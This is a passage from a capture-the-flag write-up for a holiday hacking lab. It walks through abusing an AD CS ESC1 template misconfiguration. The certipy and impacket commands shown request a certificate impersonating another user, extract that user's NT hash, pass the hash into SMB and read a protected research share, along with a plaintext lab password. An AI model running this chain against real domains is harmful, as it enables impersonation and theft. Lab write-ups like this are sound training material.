      &quot;Certificate Serial Number&quot;: &quot;16F19836C6F26A994DA811E962FC0ABC&quot;,
      &quot;Certificate Validity Start&quot;: &quot;2023-12-27 01:05:15+00:00&quot;,
      &quot;Certificate Validity End&quot;: &quot;2028-12-27 01:15:14+00:00&quot;,
      &quot;Web Enrollment&quot;: &quot;Disabled&quot;,
      &quot;User Specified SAN&quot;: &quot;Disabled&quot;,
      &quot;Request Disposition&quot;: &quot;Issue&quot;,
      &quot;Enforce Encryption for Requests&quot;: &quot;Enabled&quot;,
      &quot;Permissions&quot;: {
        &quot;Owner&quot;: &quot;NORTHPOLE.LOCAL\\Administrators&quot;,
        &quot;Access Rights&quot;: {
          &quot;2&quot;: [
            &quot;NORTHPOLE.LOCAL\\Administrators&quot;,
            &quot;NORTHPOLE.LOCAL\\Domain Admins&quot;,
            &quot;NORTHPOLE.LOCAL\\Enterprise Admins&quot;
          ],
          &quot;1&quot;: [
            &quot;NORTHPOLE.LOCAL\\Administrators&quot;,
            &quot;NORTHPOLE.LOCAL\\Domain Admins&quot;,
            &quot;NORTHPOLE.LOCAL\\Enterprise Admins&quot;
          ],
          &quot;512&quot;: [
            &quot;NORTHPOLE.LOCAL\\Authenticated Users&quot;
          ]
        }
      }
    }
  },
  &quot;Certificate Templates&quot;: {
    &quot;0&quot;: {
<span class="hll">      &quot;Template Name&quot;: &quot;NorthPoleUsers&quot;,
</span>      &quot;Display Name&quot;: &quot;NorthPoleUsers&quot;,
      &quot;Certificate Authorities&quot;: [
        &quot;northpole-npdc01-CA&quot;
      ],
      &quot;Enabled&quot;: true,
      &quot;Client Authentication&quot;: true,
      &quot;Enrollment Agent&quot;: false,
      &quot;Any Purpose&quot;: false,
      &quot;Enrollee Supplies Subject&quot;: true,
      &quot;Certificate Name Flag&quot;: [
        &quot;EnrolleeSuppliesSubject&quot;
      ],
      &quot;Enrollment Flag&quot;: [
        &quot;PublishToDs&quot;,
        &quot;IncludeSymmetricAlgorithms&quot;
      ],
      &quot;Private Key Flag&quot;: [
        &quot;ExportableKey&quot;
      ],
      &quot;Extended Key Usage&quot;: [
        &quot;Encrypting File System&quot;,
        &quot;Secure Email&quot;,
        &quot;Client Authentication&quot;
      ],
      &quot;Requires Manager Approval&quot;: false,
      &quot;Requires Key Archival&quot;: false,
      &quot;Authorized Signatures Required&quot;: 0,
      &quot;Validity Period&quot;: &quot;1 year&quot;,
      &quot;Renewal Period&quot;: &quot;6 weeks&quot;,
      &quot;Minimum RSA Key Length&quot;: 2048,
      &quot;Permissions&quot;: {
        &quot;Enrollment Permissions&quot;: {
          &quot;Enrollment Rights&quot;: [
            &quot;NORTHPOLE.LOCAL\\Domain Admins&quot;,
            &quot;NORTHPOLE.LOCAL\\Domain Users&quot;,
            &quot;NORTHPOLE.LOCAL\\Enterprise Admins&quot;
          ]
        },
        &quot;Object Control Permissions&quot;: {
          &quot;Owner&quot;: &quot;NORTHPOLE.LOCAL\\Enterprise Admins&quot;,
          &quot;Write Owner Principals&quot;: [
            &quot;NORTHPOLE.LOCAL\\Domain Admins&quot;,
            &quot;NORTHPOLE.LOCAL\\Enterprise Admins&quot;
          ],
          &quot;Write Dacl Principals&quot;: [
            &quot;NORTHPOLE.LOCAL\\Domain Admins&quot;,
            &quot;NORTHPOLE.LOCAL\\Enterprise Admins&quot;
          ],
          &quot;Write Property Principals&quot;: [
            &quot;NORTHPOLE.LOCAL\\Domain Admins&quot;,
            &quot;NORTHPOLE.LOCAL\\Enterprise Admins&quot;
          ]
        }
      },
      &quot;[!] Vulnerabilities&quot;: {
<span class="hll">        &quot;ESC1&quot;: &quot;&#39;NORTHPOLE.LOCAL\\\\Domain Users&#39; can enroll, enrollee supplies subject and template allows client authentication&quot;
</span>      }
    }
  }
</code></pre></div>
<p>I next tried to generate a certificate via certipy using the NorthPoleUsers template, but I kept getting a user not found error <code>[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</code>. <br/>
Using the <code>GetADUsers</code> impacket tool, we can get the list of Active Directory users.</p>
<div class="highlight"><pre><span></span><code>alabaster@ssh-server-vm:~/impacket$ python3 GetADUsers.py -all -dc-ip 10.0.0.53 &#39;northpole.local/elfy:J4`ufC49/J4766&#39;
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 10.0.0.53 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
alabaster                                             2023-12-27 01:02:50.392719  2023-12-27 03:10:52.363779 
Guest                                                 &lt;never&gt;              &lt;never&gt;             
krbtgt                                                2023-12-27 01:09:59.645468  &lt;never&gt;             
elfy                                                  2023-12-27 01:12:31.816538  &lt;never&gt;             
wombleycube                                           2023-12-27 01:12:31.941545  2023-12-27 03:39:42.394029 
alabaster@ssh-server-vm:~/impacket$ 
</code></pre></div>
<p>The user <code>wombleycube</code> is a good theory since the information needed for the objective is form Wombley Cube's research department. Let's get a certificate and see if we can auth as <code>wombleycube</code>.</p>
<div class="highlight"><pre><span></span><code>alabaster@ssh-server-vm:~/impacket$ certipy req -dc-ip 10.0.0.53 -u elfy -p &#39;J4`ufC49/J4766&#39; -target-ip 10.0.0.53 -ca northpole-npdc01-CA -template NorthPoleUsers
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 18
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to &#39;elfy.pfx&#39;
alabaster@ssh-server-vm:~$ certipy req -u elfy -p &#39;J4`ufC49/J4766&#39; -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers -upn &#39;wombleycube@northpole.local&#39; -pfx elfy.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 24
[*] Got certificate with UPN &#39;wombleycube@northpole.local&#39;
[*] Certificate has no object SID
[*] Saved certificate and private key to &#39;wombleycube.pfx&#39;

alabaster@ssh-server-vm:~$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to &#39;wombleycube.ccache&#39;
[*] Trying to retrieve NT hash for &#39;wombleycube&#39;
[*] Got hash for &#39;wombleycube@northpole.local&#39;: aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
</code></pre></div>
<p>We now have a hash for <code>wombleycube</code> - let's pass the hash using our trusty impacket tools.</p>
<p><div class="highlight"><pre><span></span><code>alabaster@ssh-server-vm:~/impacket$ python3 smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 northpole/wombleycube@10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# 
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
<span class="hll"># use Fileshare
</span># ls
drw-rw-rw-          0  Wed Dec 27 01:13:27 2023 .
drw-rw-rw-          0  Wed Dec 27 01:13:23 2023 ..
-rw-rw-rw-     701028  Wed Dec 27 01:13:26 2023 Cookies.pdf
-rw-rw-rw-    1521650  Wed Dec 27 01:13:26 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Wed Dec 27 01:13:27 2023 SignatureCookies.pdf
<span class="hll">drw-rw-rw-          0  Wed Dec 27 01:13:27 2023 super_secret_research
</span>-rw-rw-rw-        165  Wed Dec 27 01:13:27 2023 todo.txt
# cd super_secret_research
# ls
drw-rw-rw-          0  Wed Dec 27 01:13:27 2023 .
drw-rw-rw-          0  Wed Dec 27 01:13:27 2023 ..
<span class="hll">-rw-rw-rw-        231  Wed Dec 27 01:13:27 2023 InstructionsForEnteringSatelliteGroundStation.txt
</span># 
</code></pre></div>
We're able to access the <em>Fileshare</em> and find the file in <code>super_secret_research</code> to get our answer. We also have a treasure trove of cookie recipes!</p>
<details class="tip">
<summary>Cookie Recipes</summary>
<p>To save the cookie recipes locally on my machine, I base 64 encoded the files. Then copied the base64 from the TTY, saved it to my local host and then decoded the files. Yum!</p>
</details>
<div class="highlight"><pre><span></span><code>alabaster@ssh-server-vm:~/impacket$ cat todo.txt 
1. Bake some cookies.
2. Restrict access to C:\FileShare\super_secret_research to only researchers so everyone cant see the folder or read its contents
3. Profit

alabaster@ssh-server-vm:~/impacket$ cat InstructionsForEnteringSatelliteGroundStation.txt 
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, &#39;Now I shall be out of sight;
So through the valley and over the height.&#39;
And he&#39;ll silently take his way.
</code></pre></div>
<p>The contents of <code>InstructionsForEnteringSatelliteGroundStation.txt</code> looks like part of another challenge!</p>
<div class="admonition success">
<p class="admonition-title">Answer</p>
<p>InstructionsForEnteringSatelliteGroundStation.txt</p>
</div>
<h2 id="response">Response<a class="headerlink" href="#response" title="Permanent link">⚓︎</a></h2>
<div class="admonition quote">
<p class="admonition-title">Ribb Bonbowford</p>
<p>Wow, nice work. I'm impressed!<br/>
This is all starting to feel like more than just a coincidence though. Everything Alabaster's been setting up lately with the help of ChatNPT contains all these vulnerabilities. It almost feels deliberate, if you ask me.<br/>
Now obviously an LLM AI like ChatNPT cannot have deliberate motivations itself. It's just a machine. But I wonder who could have built it and who is controlling it?<br/>
On top of that, we apparently have a satellite ground station on Geese Islands. I wonder where that thing would even be located.<br/>
Well, I guess it's probably somewhere on Space Island, but I've not been there yet.<br/>
I'm not a big fan of jungles, you see. I have this tendency to get lost in them.<br/>
Anyway, if you feel like investigating, that'd be where I'd go look.<br/>
Good luck and I'd try and steer clear of ChatNPT if I were you.<br/></p>
</div>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2024 <a href="https://github.com/cyberbonnie">Bonnie Martin - cyberrrbonnie (at) gmail (dot) com</a>
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
    <a href="https://github.com/cyberbonnie" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.d7c377c4.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
      
        <script src="../../js/tablesort.js"></script>
      
    
  </body>
</html>